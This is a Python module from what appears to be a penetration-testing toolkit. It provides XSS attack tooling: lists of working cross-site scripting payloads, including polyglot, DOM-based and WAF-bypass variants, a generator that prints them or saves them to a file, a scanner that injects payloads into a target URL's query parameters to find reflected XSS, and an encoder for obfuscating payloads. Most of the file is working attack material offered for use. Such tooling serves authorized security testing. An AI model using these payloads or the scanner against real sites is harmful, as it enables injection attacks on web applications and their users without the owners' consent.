"""XSS tools: payload generator, reflected scanner, encoder."""
from __future__ import annotations

import html
import urllib.parse
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from rich.console import Console
from rich.table import Table

from core.i18n import t
from core.menu import Menu, MenuItem
from core.utils import (
    ask_confirm,
    ask_input,
    pause,
    print_error,
    print_info,
    print_success,
    print_warning,
)

console = Console()


BASIC_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=\"javascript:alert(1)\">",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<a href=\"javascript:alert(1)\">x</a>",
    "<details open ontoggle=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
]

POLYGLOT_PAYLOADS = [
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    "\"><img src=x onerror=alert(1)>",
    "</script><svg/onload=alert(1)>",
]

DOM_PAYLOADS = [
    "#<script>alert(1)</script>",
    "javascript:alert(document.domain)",
    "data:text/html,<script>alert(1)</script>",
]

WAF_BYPASS_PAYLOADS = [
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<ScRipT>alert(1)</sCrIpT>",
    "<img src=x oneonerrorrror=alert(1)>",
    "<svg><animate attributeName=href values=javascript:alert(1) /><a><text x=20 y=20>click</text></a></svg>",
    "<math><brute href=javascript:alert(1)>X</brute>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
]


def payload_generator() -> None:
    categories = {
        "1": ("Basic", BASIC_PAYLOADS),
        "2": ("Polyglot", POLYGLOT_PAYLOADS),
        "3": ("DOM", DOM_PAYLOADS),
        "4": ("WAF bypass", WAF_BYPASS_PAYLOADS),
        "5": ("All", BASIC_PAYLOADS + POLYGLOT_PAYLOADS + DOM_PAYLOADS + WAF_BYPASS_PAYLOADS),
    }
    console.print("[cyan]1[/]  Basic")
    console.print("[cyan]2[/]  Polyglot")
    console.print("[cyan]3[/]  DOM")
    console.print("[cyan]4[/]  WAF bypass")
    console.print("[cyan]5[/]  All")
    choice = ask_input(t("modules.xss_tools.payload_type"), default="5")
    name, payloads = categories.get(choice, categories["5"])

    save_it = ask_confirm("Save to file?", default=False)
    if save_it:
        from pathlib import Path
        output = Path(ask_input(t("ui.output_file"), default=f"xss_{name.lower()}.txt"))
        output.write_text("\n".join(payloads) + "\n", encoding="utf-8")
        print_success(t("ui.saved_to", path=output))
    else:
        table = Table(title=f"XSS payloads: {name}", border_style="cyan")
        table.add_column("#", justify="right", style="cyan")
        table.add_column("Payload", style="white", overflow="fold")
        for idx, p in enumerate(payloads, start=1):
            table.add_row(str(idx), p)
        console.print(table)
    print_info(t("modules.xss_tools.payload_saved", count=len(payloads)))
    pause()


def reflected_scanner() -> None:
    try:
        import requests
    except ImportError:
        print_error("requests not installed. Run: pip install requests")
        pause()
        return
    url = ask_input(t("ui.url"))
    if not url:
        return
    print_warning(t("ui.warning_legal"))
    if not ask_confirm(t("ui.continue_confirm"), default=False):
        return

    parsed = urlparse(url)
    params = dict(parse_qsl(parsed.query))
    if not params:
        print_error("URL has no query parameters to test.")
        pause()
        return

    session = requests.Session()
    session.headers.update({"User-Agent": "PENETRATOR/1.0"})
    findings: list[tuple[str, str]] = []

    test_marker = "penetx1337"
    for param in params:
        print_info(t("modules.xss_tools.testing", param=param))
        for payload in BASIC_PAYLOADS:
            marked = payload.replace("alert(1)", f"alert('{test_marker}')")
            mutated = dict(params)
            mutated[param] = marked
            test_url = urlunparse(parsed._replace(query=urlencode(mutated, safe="<>\"'/=()")))
            try:
                resp = session.get(test_url, timeout=8, allow_redirects=False)
            except requests.RequestException:
                continue
            if marked in resp.text:
                findings.append((param, marked))
                print_success(t("modules.xss_tools.reflected", payload=marked))

    if not findings:
        print_warning(t("ui.no_results"))
    pause()


def encoder() -> None:
    payload = ask_input("Payload")
    if not payload:
        return
    table = Table(border_style="green")
    table.add_column("Encoding", style="cyan")
    table.add_column("Result", style="white", overflow="fold")
    table.add_row("URL", urllib.parse.quote(payload, safe=""))
    table.add_row("URL (full)", urllib.parse.quote_plus(payload))
    table.add_row("HTML entity", html.escape(payload, quote=True))
    table.add_row("HTML numeric", "".join(f"&#{ord(c)};" for c in payload))
    table.add_row("Hex (\\x)", "".join(f"\\x{ord(c):02x}" for c in payload))
    table.add_row("Unicode (\\u)", "".join(f"\\u{ord(c):04x}" for c in payload))
    import base64
    table.add_row("Base64", base64.b64encode(payload.encode()).decode())
    console.print(table)
    pause()


def build_menu(parent: Menu | None = None) -> Menu:
    menu = Menu(title_key="modules.xss_tools.title", parent=parent)
    menu.add(MenuItem("modules.xss_tools.payload_generator", payload_generator,
                      "modules.xss_tools.payload_generator_desc"))
    menu.add(MenuItem("modules.xss_tools.reflected_scanner", reflected_scanner,
                      "modules.xss_tools.reflected_scanner_desc"))
    menu.add(MenuItem("modules.xss_tools.encoder", encoder,
                      "modules.xss_tools.encoder_desc"))
    return menu
